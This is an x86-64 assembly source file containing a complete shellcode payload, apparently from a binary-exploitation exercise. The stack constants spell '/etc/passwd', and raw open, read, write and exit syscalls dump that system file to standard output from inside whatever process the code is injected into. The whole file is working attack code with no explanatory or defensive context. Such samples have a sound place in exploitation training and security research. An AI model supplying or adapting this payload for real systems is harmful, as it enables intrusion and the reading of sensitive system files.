.data
.global shellcode, end

shellcode:
    .intel_syntax noprefix

    push 2
    pop rax
    xor rsi, rsi
    xor rdx, rdx
    mov r9, 0x647773
    push r9
    mov r9, 0x7361702f6374652f
    push r9
    mov rdi, rsp
    syscall

    push rax
    pop rdi
    xor rax, rax
    mov rsi, rsp
    push 0x2000
    pop rdx
    syscall

    mov rdx, rax
    xor rax, rax
    inc rax
    push rax
    pop rdi
    mov rsi, rsp
    syscall

    push 60
    pop rax
    push 0x69
    pop rdi
    syscall

end:
